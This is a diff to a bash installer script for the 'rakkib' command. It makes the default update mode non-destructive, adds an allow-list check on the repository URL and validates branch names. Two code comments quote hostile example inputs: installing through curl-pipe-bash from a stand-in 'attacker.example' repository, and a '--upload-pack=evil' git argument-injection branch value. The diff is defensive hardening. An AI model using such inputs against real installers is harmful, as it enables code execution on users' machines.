@@ -8,7 +8,7 @@ REPO_URL="${RAKKIB_REPO:-$DEFAULT_REPO_URL}"
 BRANCH="${RAKKIB_BRANCH:-$DEFAULT_BRANCH}"
 REPO_URL_OVERRIDDEN=0
 [[ -n "${RAKKIB_REPO:-}" ]] && REPO_URL_OVERRIDDEN=1
-UPDATE_MODE="${RAKKIB_UPDATE_MODE:-reset}"
+UPDATE_MODE="${RAKKIB_UPDATE_MODE:-skip}"
 VENV_INSTALL_IN_PROGRESS=0
 PLATFORM=""
 PYTHON_CMD="${RAKKIB_PYTHON:-}"
@@ -104,8 +104,11 @@ Rakkib installer. Sets up the rakkib command on this machine.
 Environment overrides:
   RAKKIB_DIR       target checkout path   (default: $HOME/Rakkib)
   RAKKIB_REPO      git repo URL           (default: https://github.com/FayaaDev/rakkib.git)
+                   only FayaaDev/rakkib or FayaaDev/rakkib-dev are accepted
   RAKKIB_BRANCH    git branch             (default: main)
-  RAKKIB_UPDATE_MODE  reset|skip          (default: reset)
+                   must match [A-Za-z0-9_][A-Za-z0-9._/-]*
+  RAKKIB_UPDATE_MODE  reset|skip          (default: skip; non-destructive)
+                   reset discards local changes before pulling
 USAGE
 }
 
@@ -119,6 +122,29 @@ parse_args() {
       *) die "unknown argument: $1" ;;
     esac
   done
+}
+
+# Defense against `RAKKIB_REPO=https://attacker.example/rakkib curl ... | bash`.
+# Only the public runtime repo and the private dev repo are accepted.
+validate_repo_url() {
+  case "$1" in
+    https://github.com/FayaaDev/rakkib|https://github.com/FayaaDev/rakkib.git) return 0 ;;
+    https://github.com/FayaaDev/rakkib-dev|https://github.com/FayaaDev/rakkib-dev.git) return 0 ;;
+    git@github.com:FayaaDev/rakkib.git|git@github.com:FayaaDev/rakkib-dev.git) return 0 ;;
+    ssh://git@github.com/FayaaDev/rakkib.git|ssh://git@github.com/FayaaDev/rakkib-dev.git) return 0 ;;
+  esac
+  die "Refusing to install from untrusted repo: $1. Set RAKKIB_REPO to FayaaDev/rakkib or FayaaDev/rakkib-dev. To install from a fork, git clone manually and run ./install.sh from the checkout."
+}
+
+# Defense against `RAKKIB_BRANCH=--upload-pack=evil` style git argument injection.
+# Branch must start with an alphanumeric or underscore, then only
+# alphanumerics, dot, underscore, slash, or hyphen.
+validate_branch() {
+  case "$1" in
+    "") die "RAKKIB_BRANCH is empty." ;;
+    [!A-Za-z0-9_]*) die "RAKKIB_BRANCH must start with [A-Za-z0-9_], got: $1" ;;
+    *[!A-Za-z0-9._/-]*) die "RAKKIB_BRANCH may only contain [A-Za-z0-9._/-], got: $1" ;;
+  esac
 }
 
 confirm_root() {
@@ -277,7 +303,7 @@ wait_for_apt_locks() {
   while true; do
     local busy=0
     for f in "${lock_files[@]}"; do
-      if [[ -e "$f" ]] && ! sudo flock -n "$f" true 2>/dev/null; then
+      if [[ -e "$f" ]] && ! run_root flock -n "$f" true 2>/dev/null; then
         busy=1
         break
       fi
@@ -294,7 +320,7 @@ wait_for_apt_locks() {
 
 apt_get() {
   local timeout="${RAKKIB_APT_LOCK_TIMEOUT:-900}"
-  sudo env \
+  run_root env \
     DEBIAN_FRONTEND=noninteractive \
     APT_LISTCHANGES_FRONTEND=none \
     NEEDRESTART_MODE=a \
@@ -583,6 +609,8 @@ EOF
 
 main() {
   parse_args "$@"
+  validate_repo_url "$REPO_URL"
+  validate_branch "$BRANCH"
   detect_platform
   confirm_root
   ensure_tooling
